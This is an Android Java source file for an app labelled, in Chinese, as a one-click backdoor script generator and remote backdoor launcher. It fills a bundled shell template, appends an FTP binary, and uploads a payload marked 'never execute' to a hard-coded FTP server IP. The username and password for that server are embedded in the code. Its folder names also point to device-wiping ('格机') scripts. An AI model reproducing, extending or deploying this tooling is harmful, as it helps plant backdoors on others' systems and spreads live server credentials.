package com.pussy.cat;

import android.Manifest;
import android.app.AlertDialog;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Random;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.Inet4Address;
import java.util.Enumeration;
import java.net.URL;
import java.net.URLConnection;
import java.net.MalformedURLException;
import java.net.UnknownHostException;

public class MainActivity extends AppCompatActivity {

    private static final String ROOT_DIR = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents/格机文件生成";
    private static final String UPLOAD_DIR = ROOT_DIR + "/上传文件夹，请勿删除和执行";
    private static final int REQUEST_CODE_PERM = 1001;
    private static final String PREFS_NAME = "FtpPrefs";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 工具栏
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        // 请求存储权限
        ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE_PERM);

        // 创建必要目录
        createDirsIfNeeded();

        // 初始化按钮
        LinearLayout mainLayout = findViewById(R.id.main_layout);
        Button btnGenerate = new Button(this);
        btnGenerate.setText("一键生成后门脚本");
        btnGenerate.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        generateScript();
                    }
                });
        Button btnRemote = new Button(this);
        btnRemote.setText("启动远程后门");
        btnRemote.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        startRemoteBackdoor();
                    }
                });
        mainLayout.addView(btnGenerate);
        mainLayout.addView(btnRemote);

        // 创建通知渠道
        createNotificationChannel();
    }

    private void createDirsIfNeeded() {
        File root = new File(ROOT_DIR);
        File upload = new File(UPLOAD_DIR);
        if (!root.exists()) {
            root.mkdirs();
        }
        if (!upload.exists()) {
            upload.mkdirs();
        }
    }

    private void generateScript() {
        try {
            // 1. 读取模板脚本
            InputStream in = getAssets().open("根文件.sh");
            byte[] buf = new byte[in.available()];
            in.read(buf);
            in.close();
            String content = new String(buf, "UTF-8");

            // 2. 替换时间戳
            String ts = String.valueOf(System.currentTimeMillis());
            content = content.replace("${current_time}", ts);

            // 3. 写入新的 .sh 文件
            File out = new File(ROOT_DIR, ts + ".sh");
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(content.getBytes("UTF-8"));
            fos.close();

            // 4. 询问是否使用自定义 FTP
            askFtpConfig(out);

        } catch (Exception e) {
            toastNotify("生成失败: " + e.getMessage());
        }
    }

    private void askFtpConfig(final File scriptFile) {
        AlertDialog.Builder dlg = new AlertDialog.Builder(this);
        dlg.setTitle("是否使用自定义FTP服务器？");
        dlg.setPositiveButton(
                "使用默认服务器",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        appendFtpBinary(scriptFile);
                    }
                });
        dlg.setNegativeButton(
                "自定义服务器",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        showCustomFtpDialog(scriptFile);
                    }
                });
        dlg.setCancelable(false);
        dlg.show();
    }

    private void showCustomFtpDialog(final File scriptFile) {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);

        final EditText etHost = new EditText(this);
        etHost.setHint("FTP服务器地址");
        final EditText etUser = new EditText(this);
        etUser.setHint("用户名");
        final EditText etPass = new EditText(this);
        etPass.setHint("密码");

        layout.addView(etHost);
        layout.addView(etUser);
        layout.addView(etPass);

        final SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        etHost.setText(prefs.getString("host", ""));
        etUser.setText(prefs.getString("user", ""));
        etPass.setText(prefs.getString("pass", ""));

        new AlertDialog.Builder(this)
                .setTitle("自定义FTP信息")
                .setView(layout)
                .setPositiveButton(
                        "确认",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                String host = etHost.getText().toString();
                                String user = etUser.getText().toString();
                                String pass = etPass.getText().toString();
                                prefs.edit().putString("host", host).putString("user", user).putString("pass", pass).apply();

                                replaceInFile(scriptFile, "172.98.22.123", host);
                                replaceInFile(scriptFile, "ser8331474429", user);
                                replaceInFile(scriptFile, "VFvh6pci4q", pass);
                                appendFtpBinary(scriptFile);
                            }
                        })
                .setCancelable(false)
                .show();
    }

    private void replaceInFile(File file, String target, String replacement) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[(int) file.length()];
            fis.read(buf);
            fis.close();
            String s = new String(buf, "UTF-8");
            s = s.replace(target, replacement);
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(s.getBytes("UTF-8"));
            fos.close();
        } catch (Exception e) {
            toastNotify("替换失败: " + e.getMessage());
        }
    }

    private void appendFtpBinary(File scriptFile) {
        try {
            InputStream in = getAssets().open("ftp二进制文件，仅用于实现ftp，不放心可以换成自己的");
            FileOutputStream fos = new FileOutputStream(scriptFile, true);
            byte[] buf = new byte[1024];
            int len;
            while ((len = in.read(buf)) != -1) {
                fos.write(buf, 0, len);
            }
            in.close();
            fos.close();
            toastNotify("生成成功，文件位于：" + scriptFile.getAbsolutePath());
        } catch (Exception e) {
            toastNotify("追加失败: " + e.getMessage());
        }
    }

    private void startRemoteBackdoor() {
        File dir = new File(ROOT_DIR);
        // 使用匿名内部类替代 Lambda，避免编译对 name 参数的误报
        final String[] scripts =
                dir.list(
                        new java.io.FilenameFilter() {
                            @Override
                            public boolean accept(File dir, String filename) {
                                return filename.endsWith(".sh");
                            }
                        });
        if (scripts == null || scripts.length == 0) {
            toastNotify("没有脚本文件可用");
            return;
        }

        new AlertDialog.Builder(this)
                .setTitle("请选择要启动的后门")
                .setItems(
                        scripts,
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                handleScriptSelection(scripts[which]);
                            }
                        })
                .setCancelable(false)
                .show();
    }

    private void handleScriptSelection(final String filename) {
        File script = new File(ROOT_DIR, filename);
        try {
            FileInputStream fis = new FileInputStream(script);
            byte[] buf = new byte[(int) script.length()];
            fis.read(buf);
            fis.close();
            String content = new String(buf, "UTF-8");
            if (content.contains("172.98.22.123")) {
    // 默认服务器上传，放到子线程执行
    new Thread(new Runnable() {
        @Override
        public void run() {
            doUpload("172.98.22.123", "ser8331474429", "VFvh6pci4q", filename);
        }
    }).start();
} else {
    showUploadCustomDialog(filename);
}
        } catch (Exception e) {
            toastNotify("读取脚本失败: " + e.getMessage());
        }
    }

    private void showUploadCustomDialog(final String filename) {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);

        final EditText etHost = new EditText(this);
        etHost.setHint("FTP服务器地址");
        final EditText etUser = new EditText(this);
        etUser.setHint("用户名");
        final EditText etPass = new EditText(this);
        etPass.setHint("密码");

        layout.addView(etHost);
        layout.addView(etUser);
        layout.addView(etPass);

        final SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        etHost.setText(prefs.getString("host", ""));
        etUser.setText(prefs.getString("user", ""));
        etPass.setText(prefs.getString("pass", ""));

        new AlertDialog.Builder(this)
                .setTitle("自定义上传FTP")
                .setView(layout)
			.setPositiveButton(
			"上传",
			new DialogInterface.OnClickListener() {
				@Override
				public void onClick(DialogInterface dialog, int which) {
					final String host = etHost.getText().toString();
					final String user = etUser.getText().toString();
					final String pass = etPass.getText().toString();
					// 放到子线程执行 FTP 上传
					new Thread(new Runnable() {
							@Override
							public void run() {
								doUpload(host, user, pass, filename);
							}
						}).start();
				}
			})
                .setCancelable(false)
                .show();
    }

    /**
     * 最简单的明文 FTP 上传
     *
     * @param host FTP 服务器地址
     * @param user 登录用户名
     * @param pass 登录密码
     * @param filename 目标文件名（位于 UPLOAD_DIR 目录中）
     */
    /**
	 * 主动模式 FTP 上传实现
	 */
	private void doUpload(final String host, final String user, final String pass, final String filename) {
		new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						// 1. 拷贝资产文件到上传目录
						InputStream in = getAssets().open("用于上传，千万不要执行.sh");
						File dst = new File(UPLOAD_DIR, filename);
						FileOutputStream fos = new FileOutputStream(dst);
						byte[] buf = new byte[1024];
						int len;
						while ((len = in.read(buf)) != -1) {
							fos.write(buf, 0, len);
						}
						in.close();
						fos.close();

						// 2. 构造 FTP 上传 URL
						URL url = new URL("ftp://" + user + ":" + pass + "@" + host + "/" + filename + ";type=i");
						URLConnection conn = url.openConnection();
						OutputStream ftpOut = conn.getOutputStream();

						// 3. 上传本地文件内容
						FileInputStream fin = new FileInputStream(dst);
						byte[] buffer = new byte[4096];
						int count;
						while ((count = fin.read(buffer)) != -1) {
							ftpOut.write(buffer, 0, count);
						}
						fin.close();
						ftpOut.close();

						// 4. 通知成功（必须在 UI 线程）
						runOnUiThread(new Runnable() {
								@Override
								public void run() {
									toastNotify("上传成功：" + filename);
								}
							});
					} catch (final Exception e) {
						e.printStackTrace();
						// 通知失败（必须在 UI 线程）
						runOnUiThread(new Runnable() {
								@Override
								public void run() {
									toastNotify("上传失败: " + e.getMessage());
								}
							});
					}
				}
			}).start();
	}
    private void toastNotify(final String msg) {
		runOnUiThread(new Runnable() {
				@Override
				public void run() {
					// Toast
					Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
					// 通知
					NotificationCompat.Builder nb = new NotificationCompat.Builder(MainActivity.this, "default")
						.setSmallIcon(android.R.drawable.stat_notify_sync)
						.setContentTitle("通知")
						.setContentText(msg)
						.setAutoCancel(true);
					NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
					nm.notify(new Random().nextInt(), nb.build());
				}
			});
	}

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("default", "默认通道", NotificationManager.IMPORTANCE_DEFAULT);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(ch);
        }
    }
}
